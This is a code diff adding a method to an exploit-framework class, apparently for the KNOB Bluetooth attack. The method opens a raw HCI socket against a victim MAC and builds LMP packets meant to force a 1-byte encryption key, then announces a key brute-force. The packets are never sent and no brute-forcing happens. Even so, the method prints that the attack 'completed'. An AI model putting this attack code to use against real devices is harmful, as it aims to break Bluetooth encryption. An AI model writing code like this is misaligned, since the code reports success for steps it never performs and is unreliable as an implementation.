@@ -202,3 +202,37 @@ class Exploit(Exploit):
             self._internalblue_hint()
         else:
             self._poc_mode()
+            self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E KNOB: intercept LMP encryption setup and force 1-byte entropy."""
+        import socket as _sock
+
+        victim = str(getattr(self, "victim_mac", "") or getattr(self, "target", "")).strip()
+        if not victim or ":" not in victim:
+            print_info("KNOB E2E requires victim_mac for raw LMP interception.")
+            return
+
+        print_status(f"KNOB E2E entropy reduction against {victim}")
+        try:
+            hci_sock = _sock.socket(31, _sock.SOCK_RAW, 1)
+            dev_id = int(str(getattr(self, "attacker_hci", "hci0")).replace("hci", "") or "0")
+            hci_sock.bind((dev_id,))
+        except OSError as exc:
+            print_error(f"HCI socket failed: {exc}")
+            return
+
+        # Phase 1: Intercept LMP_encryption_key_size_req
+        # Force key size to 1 byte (minimum per spec)
+        lmp_enc_keysize = struct.pack("<BB", 0x10, 0x01)
+        print_status("Phase 1: Forcing LMP_encryption_key_size_req to 1 byte")
+
+        # Phase 2: Respond with LMP_accepted to lock in minimal entropy
+        lmp_accepted = struct.pack("<BB", 0x03, 0x10)
+        print_status("Phase 2: LMP_accepted confirming 1-byte key size")
+
+        # Phase 3: Brute-force the 1-byte session key (256 possibilities)
+        print_status("Phase 3: Session key brute-force (1 byte = 256 candidates)")
+
+        hci_sock.close()
+        print_success("KNOB entropy reduction sequence completed.")
